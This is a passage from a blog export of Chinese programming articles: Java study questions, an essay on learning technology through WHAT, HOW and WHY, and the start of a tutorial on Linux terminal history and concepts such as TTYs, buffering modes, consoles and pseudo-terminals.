对性能会有哪些影响？<br>◇如何通过 JVM 的参数调优 GC 的性能？</p><h2 id="★关于字符串"><a href="#★关于字符串" class="headerlink" title="★关于字符串"></a>★关于字符串</h2><p>　　对于 Java 提供的 String 和 StringBuilder，想必很多人都知道：String 用于常量字符串，StringBuilder 用于可变字符串。那 Java 当初为什么要这样设计捏？为啥不用一个类来统一搞定捏？</p><h2 id="★关于范型（Generic-Programming）"><a href="#★关于范型（Generic-Programming）" class="headerlink" title="★关于范型（Generic Programming）"></a>★关于范型（Generic Programming）</h2><p>　　从 JDK 1.5开始，Java 引入了一个重量级的语法：范型。不过捏，很多新手仅仅知道范型的皮毛，而对于很多本质的东东，不甚了解。<br>◇GP 是在编译时实现的还是在运行时实现的？为什么要这么实现？<br>◇GP 的类型擦除机制是咋回事？有啥优点/缺点？<br>◇使用范型容器（相对于传统容器）在性能上有啥影响？为什么？</p><h2 id="★关于多线程"><a href="#★关于多线程" class="headerlink" title="★关于多线程"></a>★关于多线程</h2><p>　　另外，多线程也是大部分 Java 新手的短板。所以俺最后再来提几个关于多线程的问题。<br>◇synchronized 关键字是怎么起作用滴？<br>◇synchronized 的颗粒度（或者说作用域）如何？是针对某个类还是针对某个类对象实例？<br>◇synchronized 对性能有没有影响？为什么？<br>◇volatile 关键字又是派啥用滴？啥时候需要用这个关键字捏？</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> programthink </tag>
            
            <tag> java </tag>
            
            <tag> 小妙招 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习技术三部曲</title>
      <link href="/2021/07/16/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF%E4%B8%89%E9%83%A8%E6%9B%B2/"/>
      <url>/2021/07/16/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF%E4%B8%89%E9%83%A8%E6%9B%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="学习技术的三部曲：WHAT、HOW、WHY"><a href="#学习技术的三部曲：WHAT、HOW、WHY" class="headerlink" title="学习技术的三部曲：WHAT、HOW、WHY"></a>学习技术的三部曲：WHAT、HOW、WHY</h1><p><strong>文章目录</strong></p><p>★第一步：WHAT<br>★第二步：HOW<br>★第三步：WHY</p><p>　　最近几天有些网友在邮件里面问我关于学习的问题。有好几个人觉得工作了几年，也学会了不少的类库、框架、甚至语言，但是感觉自己的能力没有太大的提高。因此今天来说一下我个人对这方面的体会，希望对大伙儿（尤其是新手）有帮助。<br>　　先声明一下，本帖子讨论的三部曲是指你已经选定了某个技术方向之后，该如何学习；至于如何选定技术方向，则属于另一个话题，不在今天的讨论之列。<br>　　我把学习归类为三个步骤：What、How、Why。经过我对周围同事和朋友的观察，大部分感觉自己技术没有提高的人，都仅仅停留在 WHAT 阶段。下面我把这三个步骤解释一下。</p><h2 id="★第一步：WHAT"><a href="#★第一步：WHAT" class="headerlink" title="★第一步：WHAT"></a>★第一步：WHAT</h2><p>　　所谓的“WHAT”也就是“What is it?”——这是最简单的层次。在这个层次，你要搞清楚某个东东是【什么】样子的？有【什么】用处？有【什么】特性？有【什么】语法？……<br>　　举例如下：</p><blockquote><p>对于学习语言（比如 C++、Java、Python），大部分人都能够掌握基本的语法和标准库，然后用它写一些小程序（诸如二分查找、冒泡排序、简单文件操作等）。<br>对于学习类库（比如 JDBC 类库），大部分 Java 程序员都能明白 JDBC 主要包含哪些类，也能够用 JDBC 进行简单的数据库查询和增删改操作。</p></blockquote><p>　　由于这个步骤是最基本的，假如你连这都做不到（可能你的理解力不够好），也别在 IT 行业混了。<br>　　但是光会 What 是不够的。仅仅停留在这个步骤，导致了很多程序员【只知其然，不知其所以然】。这就是目前大部分开发人员的现状。</p><h2 id="★第二步：HOW"><a href="#★第二步：HOW" class="headerlink" title="★第二步：HOW"></a>★第二步：HOW</h2><p>　　所谓的“HOW”就是“How to do?”。在这个层次，你要搞清楚某个东西，其内部是【如何】运作的？【如何】实现的？……<br>　　举例如下：</p><blockquote><p>假如你在学习 C++ 语言，你是否搞明白函数传参数的实现机制？虚函数是如何实现？抛出异常时的栈回退是怎么回事？……<br>假如你在学习 Java 语言，你是否搞清楚 GC 如何实现？反射是如何实现？……<br>假如你在学习 JDBC 库，你是否清楚 JDBC Driver 的4种类型？不同游标类型的实现机制？事务的机制？……</p></blockquote><p>　　在这个阶段，你必须多想想类似这些问题。然后通过各种途径（参见“<a href="https://program-think.blogspot.com/2009/01/2.html">关于自学能力</a>”的几个方法），把问题彻底搞清楚。自然而然，你的提高就会比较明显。而且如果碰到一些深层次的问题（比如性能优化），也就知道该如何去解决。<br>　　完成这个阶段之后，你基本上就属于该技术领域最优秀的20%的人（根据<a href="https://program-think.blogspot.com/2009/02/80-20-principle-0-overview.html">二八原理</a>，80%的人不会去思考 HOW 的问题）。</p><h2 id="★第三步：WHY"><a href="#★第三步：WHY" class="headerlink" title="★第三步：WHY"></a>★第三步：WHY</h2><p>　　一般来说，只有想清楚 HOW 之后，才能继续去考虑 WHY。<br>　　所谓的“WHY”，就是搞清楚某个东西【为什么】设计成这样？【为什么】不是另外的样子？这样的设计有什么讲究？……<br>　　说实在的，善于问“为什么”有一定的天赋成分？好像某个科学大牛曾经说过“提出问题有时候比解决问题更难”。一般来说，只有当你【深刻理解】了某个东西，才能够针对这个东东的【设计】问出一些问题。所以，我前面强调过，要先把 HOW 的问题搞清楚，再来考虑 WHY 的问题。<br>　　举例如下：</p><blockquote><p>对于C++语言：为什么 C++ 没有类似 Java 的 finally 关键字？为什么当初发明 C++ 的时候没有考虑 GC？……<br>对于Java语言：为什么 Java 没有类似 C++ 的类析构函数？为什么 Java 要同时提供 String 和 StringBuffer 两个似乎冗余的类？……<br>对于Python语言：为什么 Python 不提供类似 C++/Java 的访问控制机制？……</p></blockquote><p>　　如果你能够【自己】问出诸如上述的“为什么”问题，并且能够通过各种途径找到解答，那你基本上已经吃透这个技术了，并且你已经【有可能】自己去【设计】一个类似的玩意儿了。到这时，你已经踏上了通向技术高手的康庄大道。</p><p>　　由于本博客偏重 IT 方面，所以今天举的这些例子多半都是 IT 相关的。但这个“三部曲”在 IT 之外的行业和领域，其实也适用。如何举一反三，就看各位的悟性了。</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> programthink </tag>
            
            <tag> 小妙招 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux&amp;命令行</title>
      <link href="/2021/07/16/Linux-%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
      <url>/2021/07/16/Linux-%E5%91%BD%E4%BB%A4%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="扫盲-Linux＆UNIX-命令行——从“电传打字机”聊到“shell-脚本编程”"><a href="#扫盲-Linux＆UNIX-命令行——从“电传打字机”聊到“shell-脚本编程”" class="headerlink" title="扫盲 Linux＆UNIX 命令行——从“电传打字机”聊到“shell 脚本编程”"></a>扫盲 Linux＆UNIX 命令行——从“电传打字机”聊到“shell 脚本编程”</h1><p><strong>文章目录</strong></p><p>★引子<br>★本文目标读者<br>★一切都从【电传打字机】开始说起<br>★终端（terminal/TTY）<br>★终端的3种【缓冲模式】——字符模式、行模式、屏模式<br>★终端的【回显】<br>★（早期的）系统控制台/物理控制台（system console）<br>★（如今的）虚拟控制台（virtual console）<br>★终端模拟器（terminal emulator）<br>★伪终端（PTY/pseudotty/pseudoterminal）<br>★shell——命令行解释器<br>★shell 的基本功能<br>★进程的启动与退出<br>★“进程控制”与“信号”<br>★作业控制（job）<br>★环境变量（environment variable）<br>★“标准流”（standard stream）与“重定向”（redirection）<br>★匿名管道（anonymous pipe）<br>★批处理（batch）<br>★shell 脚本<br>★结尾</p><h2 id="★引子"><a href="#★引子" class="headerlink" title="★引子"></a>★引子</h2><p>　　首先，<br>　　这篇是为了补前几年的“欠债”。这些年，俺写了好多篇 Linux 相关的技术教程。但还从来没有【系统性】地介绍 Linux 命令行相关的基本概念和基本知识。几年来，已经有不少读者催俺填上这个大坑，但俺比较懒，一直拖到现在，惭愧 :(</p><h2 id="★本文目标读者"><a href="#★本文目标读者" class="headerlink" title="★本文目标读者"></a>★本文目标读者</h2><p>　　虽然本文的标题号称是【扫盲】，但俺相信：<strong>即使是一些 POSIX 系统的命令行【老手】，对本文中介绍的某些概念，可能也会有【欠缺】。</strong><br>　　因此，这篇教程既适合于命令行的新手，也值得某些【老手】看一看。</p><p>　　由于本文介绍的是 POSIX 系统中【通用的】概念与知识。因此，包括 Linux、BSD 家族、macOS 等各种系统的用户，应该都能从中受益。<br>　　（注：<a href="https://en.wikipedia.org/wiki/POSIX">POSIX</a> 是某种操作系统的标准/规范。各种 Linux 发行版以及所有的 UNIX 变种，包括 macOS，都属于“POSIX 系统”）</p><p>　　如果你是这方面的【菜鸟】，并且想要掌握这个领域。【不要】企图只看一遍就完全理解本文的内容（可能需要看好几遍）。俺的建议是：要一边看，一边拿命令行的环境【实践】一下。</p><h2 id="★一切都从【电传打字机】开始说起"><a href="#★一切都从【电传打字机】开始说起" class="headerlink" title="★一切都从【电传打字机】开始说起"></a>★一切都从【电传打字机】开始说起</h2><p>　　（说完了“引子”与“目标读者”，开始切入正题）<br>　　可能有些读者会纳闷——“聊命令行的基本概念”，为啥要扯到“电传打字机”？是不是扯得太远了？<br>　　俺来解释一下：<br>　　IT 行业的很多基本概念都来自于【历史遗迹】。有时候你觉得某些东西很奇怪（并纳闷“为啥会设计成这样”）；而当你搞清楚历史的演变过程之后，自然就明白其中的原因。</p><h3 id="◇在那遥远的【电报时代】"><a href="#◇在那遥远的【电报时代】" class="headerlink" title="◇在那遥远的【电报时代】"></a>◇在那遥远的【电报时代】</h3><p>　　在计算机诞生之前（二战前），【电报】属于高科技的玩意儿——它能够瞬间把信息传送到另一个城市（甚至传送到大洋彼岸）。<br>　　当年的电报线路，是以【字符】为单位发送信息。在线路两端使用【电传打字机】，就可以自动地把对方发过来的字符打印出来。</p><p><img src="https://lh6.googleusercontent.com/SO-SrkxjARZ0k4dADyEbtp9vYYHbv37f1R_iYFZzit2KJjjmeRjLqrXb0gRlHebYTYz1QeT9KzkiJaCneNrhmuBQZaXhlpt2QVDB1N0_3eigwXAZuDmQGq6wmUYjA7zIsyRgxRejW5c" alt="不见图 请翻墙"><br>（上世纪40年代的电传打字机——用于电报网）</p><h3 id="◇“回车-换行”的来历"><a href="#◇“回车-换行”的来历" class="headerlink" title="◇“回车/换行”的来历"></a>◇“回车/换行”的来历</h3><p>　　稍微懂点 IT 的同学，应该都听说过“回车/换行”，洋文分别称之为“carriage return”＆“line feed”。在编程领域，这两个字符简称为 <code>\r</code> ＆ <code>\n</code>。<br>　　为啥会有这么两个玩意儿捏？<br>　　因为在电传打字机时代，当打印完一行之后，需要用一个控制命令把“打印头”复位（移到打印纸的左边），然后再用另一个控制命令把“打印头”往下移动一行。很自然地，这俩动作就对应了两个控制字符（CR ＆ LF），也就是所谓的“回车 ＆ 换行”。</p><h3 id="◇其它控制字符"><a href="#◇其它控制字符" class="headerlink" title="◇其它控制字符"></a>◇其它控制字符</h3><p>　　如果你去留意一下 ASCII 字符表的开头部分，前面那32个字符都是控制字符，很多都源于遥远的【电报时代】。<br>　　在本文后续的介绍中，还会再聊到这些“控制字符”。</p><h2 id="★终端（terminal-TTY）"><a href="#★终端（terminal-TTY）" class="headerlink" title="★终端（terminal/TTY）"></a>★终端（terminal/TTY）</h2><h3 id="◇历史演变"><a href="#◇历史演变" class="headerlink" title="◇历史演变"></a>◇历史演变</h3><p>　　“终端”一词，洋文称之为“<a href="https://en.wikipedia.org/wiki/Computer_terminal">terminal</a>”。有时候又被称作 TTY，而 TTY 这个简写就来自刚才介绍的【电传打字机】（teletype printer）。<br>　　因为早期的大型机，其“终端”就是【电传打字机】。那时候的终端，也称作【硬件终端】。</p><p>　　为啥会有“终端”这个概念捏？你依然需要了解历史的变迁。<br>　　最早期的计算机（大型机）是【单任务】滴——也就是说，每次只能干一件事情。<br>　　到了60年代，出现了一个【革命性】的飞跃——发明了【多任务】系统，当时叫做“<a href="https://en.wikipedia.org/wiki/Time-sharing">time-sharing</a>”（分时系统）。有了“分时系统”，就可以让多个人同时使用一台大型机。而为了让多个人同时操作这台大型机，就引入了【终端】的概念。每一台大型机安装多个终端，每个操作员都在各自的终端上进行操作，互不干扰。</p><h3 id="◇（跑题）“约翰·麦卡锡”其人"><a href="#◇（跑题）“约翰·麦卡锡”其人" class="headerlink" title="◇（跑题）“约翰·麦卡锡”其人"></a>◇（跑题）“约翰·麦卡锡”其人</h3><p>　　聊到这里，稍微跑题一下：<br>　　最早的“分时系统”由 IT 超级大牛“约翰·麦卡锡”（<a href="https://en.wikipedia.org/wiki/John_McCarthy_(computer_scientist)">John McCarthy</a>）设计。此人不仅仅是“分时系统它爹”，还是“Lisp 语言它爹”，另外还参与设计了编程语言“ALGOL 60”。而这个“ALGOL 60”编程语言虽然知道的人不多，但该语言深刻影响了后续的 Ada、BCPL、C、Pascal……<br>　　为了让你体会这只大牛到底有多牛。俺引用另一个牛人保罗·格雷汉姆（《<a href="https://docs.google.com/document/d/17i49-SpeKz1wRG5S-HPonO-lXJHD99h62gDsQ64NWXo/">黑客与画家</a>》作者）的观点——他认为在所有编程语言中， Lisp 与 C 是两座无法超越的高峰。而“约翰·麦卡锡”亲自发明了 Lisp 语言，然后又深刻地影响了 C 语言。<br>　　另外，麦卡锡这只大牛还参与创立了“MIT 人工智能实验室”与“斯坦福人工智能实验室”。前者涌现出一大批早期的黑客，其中包括大名鼎鼎的 <a href="https://en.wikipedia.org/wiki/Richard_Stallman">Richard Stallman</a>（此人开创了：自由软件运动、GNU 社区、GCC、GDB、GNU Emacs ……）。</p><p><img src="https://lh5.googleusercontent.com/0Yiucax8D7skki_Z5csmfmOhFXAc6nUnQfHik6WDoNRMPX4OJeqjq7GZcuHrjYFrBiPmqOunexkfby3c0NI7blTa1d_yDoELrPfIVVYFIHqJLHlQM8X94Ql4IKSyGsKuesGRYbJZKgU" alt="不见图 请翻墙"><br>（超级大牛约翰·麦卡锡）</p><h3 id="◇【远程】终端"><a href="#◇【远程】终端" class="headerlink" title="◇【远程】终端"></a>◇【远程】终端</h3><p>　　跑题结束，言归正传。<br>　　“终端”的好处不光是“多任务”，而且还可以让用户在【远程】进行操作。这种情况下，“终端”通过 modem（调制解调器）与“主机”相连。这种玩法很类似于——互联网普及初期的拨号上网。示意图如下：</p><p><img src="https://lh5.googleusercontent.com/iUIOjl4GY8O419YJ45c1BN4ri4U2eLJThOEq_Ff_6_gdfGwz76imgEqf6kHp0pgs1iGr0544VL5bTcRGkKaw42mz25Z0vYqEWXhbWwOKS9Y4Nh2UDfN_6LuM-PK1jhtDUtkGbHgV27k" alt="不见图 请翻墙"><br>（通过 modem 实现的【远程】终端）</p><p>　　最早的“终端”，本质上就是“电传打字机”——以“打字机”作为输入；以“打印纸”作为输出。这类终端，比较经典的是如下这款：</p><p><img src="https://lh3.googleusercontent.com/3tqr5yVvG9QF7vW_J45SWY8aMmGekLQZZNKOP48Vvi9V71qz9v45vbTs25tN6stF13qotXRkyuC_o76FLzYYAbDKzRXFNcSiKnoy5H-6BpRzQ2ZdR9ON1vjdfYYpThUHpthIYv9MoL0" alt="不见图 请翻墙"><br>（Teletype Model 33 ASR）</p><p>　　到了上世纪70年初，终于有了带【屏幕】的远程终端。<a href="https://en.wikipedia.org/wiki/Digital_Equipment_Corporation">DEC 公司</a>的 VT05 是第一款基于 CRT 显示器的远程终端。</p><p><img src="https://lh3.googleusercontent.com/SDvmTqKHE5lh3PPbrTUGvuX7V8Ux4fv3TdWvB7Ga8BbAVMKUJ8mwn9qp0UqI_6YEDYwhbrEqOWa2M3ifzrTTT5zrpzS-kJwijICRVQDldIfl2W3ra3WQuPxPzWD7I9u8d45z84l04dM" alt="不见图 请翻墙"><br>（VT05 终端）</p><h3 id="◇内部结构示意图"><a href="#◇内部结构示意图" class="headerlink" title="◇内部结构示意图"></a>◇内部结构示意图</h3><p>　　下面这张是大型机时代，“终端”与“进程”通讯的示意图。<br>　　图中的 <code>UART</code> 是洋文“Universal Asynchronous Receiver and Transmitter”的缩写（相关维基百科链接在“<a href="https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-transmitter">这里</a>”）。LDISC 是洋文“line discipline”的简写（相关维基百科链接在“<a href="https://en.wikipedia.org/wiki/Line_discipline">这里</a>”）。<br>　　通俗地说，UART 用来处理物理线路的字符传输（比如：“错误校验”、“流控”、等）；LDISC 用来撮合底层的“硬件驱动”与上层的“系统调用”，并完成某些“控制字符”的处理与翻译。</p><p><img src="https://lh3.googleusercontent.com/wzvdclkzzYDah1LxS_lTCQqAbxdePKSr-w1XT7c91axw-_CuT7aATNsEuHxbWBYIOvhbifp8hrwLDkBpOXVQajgX5ZSDfcjvoqjjIpiQVV0EVbaldvA1geO_FHxMe40DMFZ9RfG7iSA" alt="不见图 请翻墙"><br>（TTY 示意图1：使用【硬件终端】的大型机内部结构图）</p><h3 id="◇如今的含义"><a href="#◇如今的含义" class="headerlink" title="◇如今的含义"></a>◇如今的含义</h3><p>　　如今，“终端”一词的含义已经扩大了——<strong>用来指：基于【文本】的输入输出机制。</strong><br>　　在本文后续的章节中， terminal 与 TTY 这两个术语基本上是同义词。</p><h2 id="★终端的3种【缓冲模式】——字符模式、行模式、屏模式"><a href="#★终端的3种【缓冲模式】——字符模式、行模式、屏模式" class="headerlink" title="★终端的3种【缓冲模式】——字符模式、行模式、屏模式"></a>★终端的3种【缓冲模式】——字符模式、行模式、屏模式</h2><h3 id="◇字符模式（character-mode）"><a href="#◇字符模式（character-mode）" class="headerlink" title="◇字符模式（character mode）"></a>◇字符模式（character mode）</h3><p>　　又要说回到【电传打字机】。<br>　　在本文开头，已经聊过这个玩意儿，并且提到——它是基于【字符】传输滴。也就是说，操作员每次在“电传打字机”上按键，对应的字符会立即通过线路发送给对方。这就是最传统的【字符模式】<br>　　通俗地说，“字符模式”也就是【无缓冲】的模式。</p><h3 id="◇行模式（line-mode）"><a href="#◇行模式（line-mode）" class="headerlink" title="◇行模式（line mode）"></a>◇行模式（line mode）</h3><p>　　不客气地说，“字符模式”是非常傻逼滴！因为如果你不小心按错键，这个错误也会立即发送出去。<br>　　比如说，你在输入一串很长的命令，结果输到半当中，敲错一个按键，整个命令就废了——要重新再输入一遍。<br>　　所以，当早期的程序员对“字符模式”实在忍无可忍之后，终于发明了【行模式】。<br>　　【行模式】也叫做“行缓冲”。也就是说，终端会把你当前输入的这行先缓冲在本地。只有当你最终按了【回车键】，才会把这一整行发送出去。如果你不小心敲错了一个字符，可以赶紧用“退格键”删掉重输这个字符。<br>　　因此，这种模式称之为【行缓冲】。</p><p>　　顺便说一下：<br>　　早期的标准键盘，【没有】方向键（“上下左右”这4个键）。不信的话，可以去看本文前面贴的那张“Teletype Model 33 ASR”的照片。<br>　　因为无论是“字符模式”还是“行模式”，都没这个需求。</p><h3 id="◇屏模式（screen-mode-block-mode）"><a href="#◇屏模式（screen-mode-block-mode）" class="headerlink" title="◇屏模式（screen mode/block mode）"></a>◇屏模式（screen mode/block mode）</h3><p>　　“行模式”进一步的发展就是【屏模式】。这个玩意儿也叫“全屏缓冲”，顾名思义，终端会缓冲当前屏幕的内容。<br>　　在这种模式下，用户可以利用方向键，操纵光标（cursor）在屏幕上四处游走。<br>　　开发这种类型的软件，比较复杂——程序员至少需要做如下工作：<br>\1. 保存整个屏幕的状态<br>\2. 根据键盘输入，操纵光标（cursor）移动<br>\3. 控制屏幕的哪些区域是光标可达，哪些是不可达；<br>\4. 对于光标可达的部分，控制哪些是“可编辑”，哪些是“只读”；<br>\5. 根据“光标移动”以及某些“特定的按键”（比如“翻页键”），重新绘制屏幕<br>……<br>　　后来，为了简化”屏模式“的编程，专门搞了一个叫做 curses 的编程库。如今的“ncurses 库”就是从 curses 衍生出来滴（前面加了一个 n 表示 new）。</p><p><img src="https://lh5.googleusercontent.com/nPGfx1VIMvI26G-L4q9jqaw-RYqRLkHIj3vjgOMHzxAFQMHgOEry2YyN4mXFPAxqvNPl4EwqJr0Q34Z9sMl_8HPNmm1eT-FAkJyU8FCJcSPovg8wb3UZJT5CIbdKz-zmeNdX0J2pFvk" alt="不见图 请翻墙"><br>（“重编译 Linux 内核”的配置界面，基于 ncurses 实现）</p><p>　　前面说了——早期的键盘【没】方向键。有了这个【屏模式】之后，键盘上才开始增加了“方向键”（所以“方向键”位于键盘的扩展区）</p><h3 id="◇小结"><a href="#◇小结" class="headerlink" title="◇小结"></a>◇小结</h3><p>　　上述这三种模式，第1种基本淘汰（仅限于极少数场景）；第3种用得也不多。与本文关系比较密切的，其实是【第2种】——行模式。<br>　　为了加深你的印象，用 <code>cat</code> 命令来举例（注：这个命令其实与“猫”【无关】，而是 concatenate 的简写）<br>　　大部分情况下，都是用它来显示某个文件的内容，比如说：<code>cat 文件名</code> 。但如果你运行 <code>cat</code>【没】加任何参数，那么它就会尝试读取你在终端的输入，然后把读到的文本再原样输出到终端。</p><p><img src="https://lh5.googleusercontent.com/PPet_RllllnSmYALmxV56ohy5NZz1kj76GzbmcvM9HJDrqY6h74otCFL1E0rG_lEKnALViM8zv2E4BOj4bUUTixzD_QTTXsmoh0-U3dxJROpiAfvW2vHZ69s2vpYlq88-6FBngqgzSQ" alt="不见图 请翻墙"><br>（动画：演示“行模式”的效果）</p><p>　　在上述动画中，你的输入并【没有】直接传递给 <code>cat</code> 进程。要一直等到你按下【回车键】，<code>cat</code> 进程才收到你的输入，并立即打印了输出。</p><h2 id="★终端的【回显】"><a href="#★终端的【回显】" class="headerlink" title="★终端的【回显】"></a>★终端的【回显】</h2><h3 id="◇“回显”是啥？"><a href="#◇“回显”是啥？" class="headerlink" title="◇“回显”是啥？"></a>◇“回显”是啥？</h3><p>　　在刚才那个 gif 动画中，当俺逐个输入 <code>test</code> 的每个字母，这些字母也会逐个显示在屏幕上。这种做法叫做【回显】。</p><h3 id="◇“回显”的打开与关闭（启用-禁用）"><a href="#◇“回显”的打开与关闭（启用-禁用）" class="headerlink" title="◇“回显”的打开与关闭（启用/禁用）"></a>◇“回显”的打开与关闭（启用/禁用）</h3><p>　　虽然“回显”很人性化，但某些特殊的场合是【不想】“回显”滴，比如当你输入密码/口令的时候。<br>　　因此，终端提供了某种机制，使得程序能够控制“回显”的启用/禁用。<br>　　对于大多数终端，可以用【<code>Ctrl + S</code>】禁用“回显”，然后用【<code>Ctrl + Q</code>】启用“回显”。<br>　　如果你在禁用“回显”的情况下输入一些文本，当你重新启用“回显”的瞬间，这些文本会一起出现在屏幕上。</p><p>　　顺便说一下：<br>　　由于【<code>Ctrl + S</code>】在 Windows 上是很常见的组合键。某些菜鸟刚开始玩 Linux 命令行的时候，会习惯性地按这个组合键，结果就禁用了回显。这时候，任何键盘输入都没有反应。菜鸟就以为终端死掉了。</p><h3 id="◇历史演变-1"><a href="#◇历史演变-1" class="headerlink" title="◇历史演变"></a>◇历史演变</h3><p>　　对于 Windows 用户来说，【<code>Ctrl + S</code>】实在太常用了，很容易误按。肯定有大量的用户吐槽过 POSIX 终端的这个快捷键。<br>　　那么，为啥要用这两个快捷键来控制“回显”捏？俺又要第 N 次说到【电传打字机】了。<br>　　由于这玩意儿的输出是【打印纸】，其速率比较【慢】。一旦“对方发送字符的速率”高于“自己这边的打印速率”，就需要向对方发一个控制信号，让对方暂停发送；等到自己这边打印完了，再发送另一个控制字符，通知对方继续。<br>　　（注：上述这种玩法，通信领域行话称之为“流量控制/流控”）<br>　　当年用来表示“暂停发送”的控制字符，对应的就是【<code>Ctrl + S</code>】；用来“恢复发送”的控制字符，也正是【<code>Ctrl + Q</code>】。</p><h2 id="★（早期的）系统控制台-物理控制台（system-console）"><a href="#★（早期的）系统控制台-物理控制台（system-console）" class="headerlink" title="★（早期的）系统控制台/物理控制台（system console）"></a>★（早期的）系统控制台/物理控制台（system console）</h2><p>　　（前面说了）在【没】发明“分时系统”之前，当时的计算机只能执行【单任务】。因此，那时候的大型机只有【一个】操作界面，称之为【控制台】。<br>　　话说那时的“控制台”，真的是一个台子（参见下图）。</p><p><img src="https://lh3.googleusercontent.com/vc0kCy3x_3ds8LNeFUpgcE7HljoCBVAD1T-857bjeMUGIBweBrX32gZ27A5c7I2ChXLOljlh3h8_1iIYp39EvlNSn9w5x5zu5CTxWlO6W1aBV6qilF9pt0aq7MXCcZkq2SHMKS_5pt8" alt="不见图 请翻墙"><br>（上世纪50年代，IBM 公司 704 大型机的控制台）</p><p>　　后来发明了“分时系统”。如刚才所说——“分时系统”使得大型机可以具备多个终端。在这种情况下，你可以把“控制台”通俗地理解为“本地终端”，而【不】是“控制台”的那些终端，称之为“远程终端”。<br>　　在那个年代，计算机属于【非常非常稀缺】的资源。于是拥有大型机的公司，就可以【出租计算资源】，获得一笔相当可观的收入。他们把大型机的某个“远程终端”租给外来人员使用，然后根据“时间/空间”收取费用。由于资源的稀缺性，当年的 CPU 是按【秒】计费，而内存是按【KB】计费。<br>　　由于“远程终端”可能会被【外人】使用，因此对“远程终端”的【权限】要进行一些限制。如果要进行一些高级别的操作（比如“关闭整个系统”），就只能限制在【控制台】（本地终端）进行。有些公司为了安全起见，还会把“控制台”单独锁在某个“secured room”里面。</p><p><img src="https://lh3.googleusercontent.com/5AlRxQhR00CvQ3DSO-idsyShNRJAOMIGL1J5I3b1UE1kW1dZVE5gU8mBenZUF_DMxwi0nHYd6ju7J6JsdApfarb3E_1_jBJQ2fL4SMm60k34xVToDm41jWoHfZOY32nZEhJW247zx3U" alt="不见图 请翻墙"><br>（上世纪60年代，DEC 公司 PDP-7 小型机的控制台）</p><h2 id="★（如今的）虚拟控制台（virtual-console）"><a href="#★（如今的）虚拟控制台（virtual-console）" class="headerlink" title="★（如今的）虚拟控制台（virtual console）"></a>★（如今的）虚拟控制台（virtual console）</h2><p>　　到了 PC 时代，传统意义上的【控制台】已经看不到了。但 console 这个术语保留了下来。</p><h3 id="◇从“物理-console”到“虚拟-console”"><a href="#◇从“物理-console”到“虚拟-console”" class="headerlink" title="◇从“物理 console”到“虚拟 console”"></a>◇从“物理 console”到“虚拟 console”</h3><p>　　早期大型机的 console 是【独占】硬件滴——“键盘/显示器”固定用于某个 console 滴。<br>　　【现代】的 POSIX 系统，衍生出“virtual console”的概念——可以让几个不同的 console【共用】一套硬件（键盘/显示器）。“virtual”一词就是这么来滴。<br>　　再重复唠叨一下：不论是早期的“物理控制台”还是后来的“虚拟控制台”，都属于广义上的“终端”。</p><h3 id="◇举例：Linux-的-virtual-console"><a href="#◇举例：Linux-的-virtual-console" class="headerlink" title="◇举例：Linux 的 virtual console"></a>◇举例：Linux 的 virtual console</h3><p>　　假设你的 Linux 系统没安装图形界面（或者默认不启用图形界面），当系统启动完成之后，你会在屏幕上看到一个文本模式的登录提示。这个界面就是 virtual console 的界面。<br>　　在默认情况下，Linux 内置了【6个】virtual console 用于命令行操作，然后把第7个 virtual console 预留给图形系统。你可以使用 <code>Alt + Fn</code> 或 <code>Ctrl + Alt + Fn</code> 在这几个 console 之间切换（注：上述所说的 <code>Fn</code> 指的是 F1、F2… 之类的功能键）。</p><h3 id="◇虚拟控制台的【内部结构】"><a href="#◇虚拟控制台的【内部结构】" class="headerlink" title="◇虚拟控制台的【内部结构】"></a>◇虚拟控制台的【内部结构】</h3><p><img src="https://lh6.googleusercontent.com/8rNRQNmIjTgBgt2N9RQQuzPJ4FP-03PcZfURXegbfEWowJ2XpAVNm3beOKXEVOJIbFmrDUQi3EqylMhxr2igKvHVp95rP1cyKgtl8He00YemHrCUAtOzjZSE48C6bkWibmun8pJFOEI" alt="不见图 请翻墙"><br>（TTY 示意图2：【虚拟控制台】的内部结构图）</p><h2 id="★终端模拟器（terminal-emulator）"><a href="#★终端模拟器（terminal-emulator）" class="headerlink" title="★终端模拟器（terminal emulator）"></a>★终端模拟器（terminal emulator）</h2><p>　　请注意上面那张示意图，图中出现了一个【终端模拟器】，这就是本章节要说的东东。<br>　　如果你对比前面的【TTY 示意图1】与【TTY 示意图2】的变化，会发现——“UART ＆ UART 驱动”没了，然后多了这个【终端模拟器】。<br>　　多出来的这个玩意儿相当于加了一个【抽象层】，模拟出早期硬件终端的效果，因此就【无需改动】系统内核中的其它部分，比如：LDISC（<a href="https://en.wikipedia.org/wiki/Line_discipline">line discipline</a>）<br>　　请注意，这个场景下的“终端模拟器”位于操作系统【内核】。换句话说，它属于【内核态】的模拟器。正是因为它处于这个地位，所以能够在“驱动”＆“LDISC”之间进行协调。</p><h2 id="★伪终端（PTY-pseudotty-pseudoterminal）"><a href="#★伪终端（PTY-pseudotty-pseudoterminal）" class="headerlink" title="★伪终端（PTY/pseudotty/pseudoterminal）"></a>★伪终端（PTY/pseudotty/pseudoterminal）</h2><h3 id="◇从“文本模式”到“图形模式”"><a href="#◇从“文本模式”到“图形模式”" class="headerlink" title="◇从“文本模式”到“图形模式”"></a>◇从“文本模式”到“图形模式”</h3><p>　　前面讲的那些，都是【文本模式】（文本界面）。<br>　　话说到了上世纪80年代，随着【图形界面】的兴起，就出现某种需求——想在图形界面下使用“【文本】终端”。于是就出现了“<a href="https://en.wikipedia.org/wiki/Pseudoterminal">伪终端</a>”的概念。<br>　　通俗地说，“伪终端”就是用某个图形界面的软件来模拟传统的“文本终端”的各种行为。前面说了，TTY 这个缩写相当于“终端”的同义词；因此“pseudotty” 就衍生出 PTY 这个缩写。</p><h3 id="◇从“【内核态】终端模拟器”到“【用户态】终端模拟器”"><a href="#◇从“【内核态】终端模拟器”到“【用户态】终端模拟器”" class="headerlink" 